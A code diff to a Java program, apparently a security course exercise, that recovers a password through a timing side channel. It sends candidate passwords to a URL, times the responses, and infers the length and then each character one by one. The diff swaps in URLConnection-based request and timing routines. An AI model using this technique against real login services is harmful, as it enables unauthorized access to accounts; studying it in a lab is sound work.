@@ -2,8 +2,7 @@ package ex01_M2;
 
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-
-import com.sun.xml.internal.ws.util.StringUtils;
+import java.net.*;
 
 public class ex01_M2 {
 
@@ -17,7 +16,7 @@ public class ex01_M2 {
 	 * @param args
 	 */
 	public static void main(String[] args) throws Exception {
-		int difficulty = 1;
+		int difficulty = 50;
 		int attempts = 10;
 		//		int len = findPasswordLength(3, difficulty);
 		//		System.out.println("password length: "+len);
@@ -37,11 +36,12 @@ public class ex01_M2 {
 		double reqTime = 0;
 
 		String passwd = "";
-		for (int i = 0; i < maxLen; i++) {
+		for (int i = 1; i < maxLen; i++) {
 			reqTime = 0;
 			passwd += "a";
 			for (int j = 0; j < attempts; j++) {
-				reqTime += getReqTime(URL+passwd+DIFFICULTY+difficulty); 
+				double res = getReqTime(URL+passwd+DIFFICULTY+difficulty);
+				reqTime += res; 
 			}
 			reqTime = reqTime/attempts;
 			if (maxReqTime < reqTime) {
@@ -69,10 +69,10 @@ public class ex01_M2 {
 		StringBuilder passwd = new StringBuilder(tmpPass);
 
 		for (int i = 0; i < len -1; i++) {
-			
+
 			maxReqTime = 0;
 			tmpPass = new StringBuilder(passwd);
-			
+
 			for (int j = 0; j < lettersLen; j++) {
 
 				reqTime = 0;
@@ -88,7 +88,7 @@ public class ex01_M2 {
 					maxReqTime = reqTime;
 					passwd.setCharAt(i, LETTERS[j]);
 				}
-				
+
 				System.out.println("reqTime: "+reqTime+", tmPass: "+tmpPass);
 			}
 		}
@@ -105,6 +105,8 @@ public class ex01_M2 {
 		return passwd.toString();
 	}
 
+	/*
+
 	public static boolean sendReq(String url) {
 
 		try {
@@ -119,6 +121,7 @@ public class ex01_M2 {
 		return false;
 	}
 
+
 	public static double getReqTime(String url) {
 
 		try {
@@ -127,6 +130,45 @@ public class ex01_M2 {
 
 			stdInput.readLine();
 			return Double.parseDouble(stdInput.readLine());
+
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return -1;
+	}
+	 */
+
+	public static boolean sendReq(String urlString) {
+
+		try {
+			URL url = new URL(urlString);
+			URLConnection conn = url.openConnection();
+			BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+
+			boolean res = stdInput.readLine().equals("1");
+			stdInput.close();
+
+			return res;
+
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return false;
+	}
+
+
+	public static double getReqTime(String urlString) {
+		try {
+
+			long milliStart = System.currentTimeMillis();
+
+			URL url = new URL(urlString);
+			URLConnection conn = url.openConnection();
+			conn.getInputStream();
+			
+			long milliEnd = System.currentTimeMillis();
+
+			return milliEnd - milliStart;
 
 		} catch (Exception e) {
 			e.printStackTrace();
